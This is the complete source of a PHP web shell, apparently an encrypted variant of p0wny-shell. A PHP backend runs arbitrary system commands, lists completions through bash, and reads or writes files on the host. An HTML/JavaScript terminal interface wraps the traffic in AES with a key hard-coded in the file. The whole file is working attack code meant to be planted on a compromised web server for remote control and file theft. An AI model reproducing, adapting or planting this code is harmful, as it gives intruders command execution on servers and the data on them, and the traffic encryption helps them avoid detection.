<?php 
$secretkey = "this-is-not-lmao";
function CryptoJSAesEncrypt($plain_text)
{
    $passphrase = $GLOBALS['secretkey'];
    $salt = openssl_random_pseudo_bytes(256);
    $iv = openssl_random_pseudo_bytes(16);
    $iterations = 999;
    $key = hash_pbkdf2("sha512", $passphrase, $salt, $iterations, 64);
    $encrypted_data = openssl_encrypt($plain_text, 'aes-256-cbc', hex2bin($key), OPENSSL_RAW_DATA, $iv);
    $data = array("ciphertext" => base64_encode($encrypted_data), "iv" => bin2hex($iv), "salt" => bin2hex($salt));
    return json_encode($data);
}

function CryptoJSAesDecrypt($jsonString)
{
    $passphrase = $GLOBALS['secretkey'];
    $jsondata = json_decode(json_decode($jsonString,true),true);
    try {
        $salt = hex2bin($jsondata["salt"]);
        $iv  = hex2bin($jsondata["iv"]);
    } catch (Exception $e) {
        return null;
    }
    $ciphertext = base64_decode($jsondata["ciphertext"]);
    $iterations = 999;
    $key = hash_pbkdf2("sha512", $passphrase, $salt, $iterations, 64);
    $decrypted = openssl_decrypt($ciphertext, 'aes-256-cbc', hex2bin($key), OPENSSL_RAW_DATA, $iv);
    return $decrypted;
}

function expandPath($path)
{
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function featureShell($cmd, $cwd)
{
    $stdout = array();

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return json_encode(array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    ));
}

function featurePwd()
{
    return json_encode(array("cwd" => getcwd()));
}

function featureHint($fileName, $cwd, $type)
{
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return json_encode(array(
        'files' => $files,
    ));
}

function featureDownload($filePath)
{
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return json_encode(array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        ));
    }
}

function featureUpload($path, $file, $cwd)
{
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return json_encode(array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        ));
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;
    $data = json_decode(CryptoJSAesDecrypt(base64_decode($_POST['data'])),true);
    switch ($_GET["feature"]) {
        case "shell":
            // $cmd = $_POST['cmd'];
            $cmd = $data['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $data["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($data['filename'], $data['cwd'], $data['type']);
            break;
        case 'upload':
            $response = featureUpload($data['path'], $data['file'], $data['cwd']);
    }

    header("Content-Type: text/plain");
    echo CryptoJSAesEncrypt($response);
    die();
}

?>
<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8" />
    <title>p0wny@shell:~#</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            background: #333;
            color: #eee;
            font-family: monospace;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }

        *::-webkit-scrollbar-track {
            border-radius: 8px;
            background-color: #353535;
        }

        *::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        *::-webkit-scrollbar-thumb {
            border-radius: 8px;
            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
            background-color: #bcbcbc;
        }

        #shell {
            background: #222;
            box-shadow: 0 0 5px rgba(0, 0, 0, .3);
            font-size: 10pt;
            display: flex;
            flex-direction: column;
            align-items: stretch;
            max-width: calc(100vw - 2 * var(--shell-margin));
            max-height: calc(100vh - 2 * var(--shell-margin));
            resize: both;
            overflow: hidden;
            width: 100%;
            height: 100%;
            margin: var(--shell-margin) auto;
        }

        #shell-content {
            overflow: auto;
            padding: 5px;
            white-space: pre-wrap;
            flex-grow: 1;
        }

        #shell-logo {
            font-weight: bold;
            color: #FF4180;
            text-align: center;
        }

        :root {
            --shell-margin: 25px;
        }

        @media (min-width: 1200px) {
            :root {
                --shell-margin: 50px !important;
            }
        }

        @media (max-width: 991px),
        (max-height: 600px) {
            #shell-logo {
                font-size: 6px;
                margin: -25px 0;
            }

            :root {
                --shell-margin: 0 !important;
            }

            #shell {
                resize: none;
            }
        }

        @media (max-width: 767px) {
            #shell-input {
                flex-direction: column;
            }
        }

        @media (max-width: 320px) {
            #shell-logo {
                font-size: 5px;
            }
        }

        .shell-prompt {
            font-weight: bold;
            color: #75DF0B;
        }

        .shell-prompt>span {
            color: #1BC9E7;
        }

        #shell-input {
            display: flex;
            box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
            border-top: rgba(255, 255, 255, .05) solid 1px;
            padding: 10px 0;
        }

        #shell-input>label {
            flex-grow: 0;
            display: block;
            padding: 0 5px;
            height: 30px;
            line-height: 30px;
        }

        #shell-input #shell-cmd {
            height: 30px;
            line-height: 30px;
            border: none;
            background: transparent;
            color: #eee;
            font-family: monospace;
            font-size: 10pt;
            width: 100%;
            align-self: center;
            box-sizing: border-box;
        }

        #shell-input div {
            flex-grow: 1;
            align-items: stretch;
        }

        #shell-input input {
            outline: none;
        }
    </style>

    <script>
        var CWD = null;
        var commandHistory = [];
        var historyPosition = 0;
        var eShellCmdInput = null;
        var eShellContent = null;
        let secretkey = "<?php echo $secretkey ?>";

        function CryptoJSAesDecrypt(encrypted_json_string) {
            var passphrase = secretkey;
            var obj_json = JSON.parse(encrypted_json_string);
            var encrypted = obj_json.ciphertext;
            var salt = CryptoJS.enc.Hex.parse(obj_json.salt);
            var iv = CryptoJS.enc.Hex.parse(obj_json.iv);
            var key = CryptoJS.PBKDF2(passphrase, salt, {
                hasher: CryptoJS.algo.SHA512,
                keySize: 64 / 8,
                iterations: 999
            });
            var decrypted = CryptoJS.AES.decrypt(encrypted, key, {
                iv: iv
            });
            return decrypted.toString(CryptoJS.enc.Utf8);
        }

        function CryptoJSAesEncrypt(plain_text) {
            var passphrase = secretkey;
            var salt = CryptoJS.lib.WordArray.random(256);
            var iv = CryptoJS.lib.WordArray.random(16);
            var key = CryptoJS.PBKDF2(passphrase, salt, {
                hasher: CryptoJS.algo.SHA512,
                keySize: 64 / 8,
                iterations: 999
            });
            var encrypted = CryptoJS.AES.encrypt(plain_text, key, {
                iv: iv
            });
            var data = {
                ciphertext: CryptoJS.enc.Base64.stringify(encrypted.ciphertext),
                salt: CryptoJS.enc.Hex.stringify(salt),
                iv: CryptoJS.enc.Hex.stringify(iv)
            }
            return JSON.stringify(data);
        }

        function _insertCommand(command) {
            eShellContent.innerHTML += "\n\n";
            eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
            eShellContent.innerHTML += escapeHtml(command);
            eShellContent.innerHTML += "\n";
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function _insertStdout(stdout) {
            eShellContent.innerHTML += escapeHtml(stdout);
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function _defer(callback) {
            setTimeout(callback, 0);
        }

        function featureShell(command) {

            _insertCommand(command);
            if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
            } else if (/^\s*clear\s*$/.test(command)) {
                // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                eShellContent.innerHTML = '';
            } else {
                makeRequest("?feature=shell", {
                    cmd: command,
                    cwd: CWD
                }, function(response) {
                    resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                    console.log(resp);
                        if (resp.hasOwnProperty('file')) {
                            featureDownload(resp.name, resp.file)
                        } else {
                            _insertStdout(resp.stdout.join("\n"));
                            updateCwd(resp.cwd);
                        }
                });
            }
        }

        function featureHint() {
            if (eShellCmdInput.value.trim().length === 0) return; // field is empty -> nothing to complete

            function _requestCallback(data) {
                var d = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(data)));
                if (d.files.length <= 1) return; // no completion

                if (d.files.length === 2) {
                    if (type === 'cmd') {
                        eShellCmdInput.value = d.files[0];
                    } else {
                        var currentValue = eShellCmdInput.value;
                        eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, d.files[0]);
                    }
                } else {
                    _insertCommand(eShellCmdInput.value);
                    _insertStdout(d.files.join("\n"));
                }
            }

            var currentCmd = eShellCmdInput.value.split(" ");
            var type = (currentCmd.length === 1) ? "cmd" : "file";
            var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

            makeRequest(
                "?feature=hint", {
                    filename: fileName,
                    cwd: CWD,
                    type: type
                },
                _requestCallback
            );

        }

        function featureDownload(name, file) {
            var element = document.createElement('a');
            element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
            element.setAttribute('download', name);
            element.style.display = 'none';
            document.body.appendChild(element);
            element.click();
            document.body.removeChild(element);
            _insertStdout('Done.');
        }

        function featureUpload(path) {
            var element = document.createElement('input');
            element.setAttribute('type', 'file');
            element.style.display = 'none';
            document.body.appendChild(element);
            element.addEventListener('change', function() {
                var promise = getBase64(element.files[0]);
                promise.then(function(file) {
                    makeRequest('?feature=upload', {
                        path: path,
                        file: file,
                        cwd: CWD
                    }, function(response) {
                        resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                        _insertStdout(resp.stdout.join("\n"));
                        updateCwd(resp.cwd);
                    });
                }, function() {
                    _insertStdout('An unknown client-side error occurred.');
                });
            });
            element.click();
            document.body.removeChild(element);
        }

        function getBase64(file, onLoadCallback) {
            return new Promise(function(resolve, reject) {
                var reader = new FileReader();
                reader.onload = function() {
                    resolve(reader.result.match(/base64,(.*)$/)[1]);
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        function genPrompt(cwd) {
            cwd = cwd || "~";
            var shortCwd = cwd;
            if (cwd.split("/").length > 3) {
                var splittedCwd = cwd.split("/");
                shortCwd = "…/" + splittedCwd[splittedCwd.length - 2] + "/" + splittedCwd[splittedCwd.length - 1];
            }
            return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
        }

        function updateCwd(cwd) {
            if (cwd) {
                CWD = cwd;
                _updatePrompt();
                return;
            }
            makeRequest("?feature=pwd", {}, function(response) {
                resp = JSON.parse(CryptoJSAesDecrypt(JSON.stringify(response)));
                CWD = resp.cwd;
                _updatePrompt();
            });

        }

        function escapeHtml(string) {
            return string
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;");
        }

        function _updatePrompt() {
            var eShellPrompt = document.getElementById("shell-prompt");
            eShellPrompt.innerHTML = genPrompt(CWD);
        }

        function _onShellCmdKeyDown(event) {
            switch (event.key) {
                case "Enter":
                    featureShell(eShellCmdInput.value);
                    insertToHistory(eShellCmdInput.value);
                    eShellCmdInput.value = "";
                    break;
                case "ArrowUp":
                    if (historyPosition > 0) {
                        historyPosition--;
                        eShellCmdInput.blur();
                        eShellCmdInput.value = commandHistory[historyPosition];
                        _defer(function() {
                            eShellCmdInput.focus();
                        });
                    }
                    break;
                case "ArrowDown":
                    if (historyPosition >= commandHistory.length) {
                        break;
                    }
                    historyPosition++;
                    if (historyPosition === commandHistory.length) {
                        eShellCmdInput.value = "";
                    } else {
                        eShellCmdInput.blur();
                        eShellCmdInput.focus();
                        eShellCmdInput.value = commandHistory[historyPosition];
                    }
                    break;
                case 'Tab':
                    event.preventDefault();
                    featureHint();
                    break;
            }
        }

        function insertToHistory(cmd) {
            commandHistory.push(cmd);
            historyPosition = commandHistory.length;
        }

        function makeRequest(url, params, callback) {
            function getQueryString() {
                return JSON.stringify(params);
            }
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    try {
                        var responseJson = JSON.parse(xhr.responseText);
                        callback(responseJson);
                    } catch (error) {
                        alert("Error while parsing response: " + error);
                    }
                }
            };
            xhr.send("data="+btoa(JSON.stringify(CryptoJSAesEncrypt(getQueryString()))));
        }

        document.onclick = function(event) {
            event = event || window.event;
            var selection = window.getSelection();
            var target = event.target || event.srcElement;

            if (target.tagName === "SELECT") {
                return;
            }

            if (!selection.toString()) {
                eShellCmdInput.focus();
            }
        };

        window.onload = function() {
            eShellCmdInput = document.getElementById("shell-cmd");
            eShellContent = document.getElementById("shell-content");
            updateCwd();
            eShellCmdInput.focus();
        };
    </script>
</head>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" integrity="sha512-E8QSvWZ0eCLGk4km3hxSsNmGWbLtSCSUcewDQPQWZF6pEU8GlT8a5fF32wOl1i8ftdMhssTrF/OhyGWwonTcXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<body>
    <div id="shell">
        <pre id="shell-content">
                <div id="shell-logo">
        ___                         ____      _          _ _          _  _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |  _ /\/|| || |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | | (_)/\/_  ..  _|/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |  _   |_      _|  |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_| (_)    |_||_|      |_||_|  <span></span>
|_|                         |___/  \____/                                                <span></span>
                </div>
            </pre>
        <div id="shell-input">
            <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
            <div>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" />
            </div>
        </div>
    </div>
</body>

</html>